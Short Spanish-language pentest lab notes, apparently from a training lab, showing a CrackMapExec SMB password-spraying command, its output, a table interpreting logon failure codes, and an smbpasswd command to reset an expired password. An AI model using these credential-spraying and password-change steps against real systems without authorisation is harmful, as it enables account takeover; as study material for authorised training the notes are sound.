# Intro

CME nos va a dar respuestas en distintos casos de intentos de logueo:

#### Ej:
crackmapexec smb 10.129.203.121 -u julio peter -p Inlanefreight01!

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\julio:Inlanefreight01! **STATUS_LOGON_FAILURE** 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\peter:Inlanefreight01! **STATUS_PASSWORD_MUST_CHANGE**


| respuesta | definicion |
|----|----|
|STATUS_INVALID_LOGON_HOURS | Probar en otro horario |
|STATUS_INVALID_WORKSTATION  |  Probar en otra computadora |
|STATUS_PASSWORD_MUST_CHANGE |  El password es correcto pero "venció" y debemos cambiarlo|

### STATUS_PASSWORD_MUST_CHANGE

    smbpasswd -r 10.129.203.121 -U peter
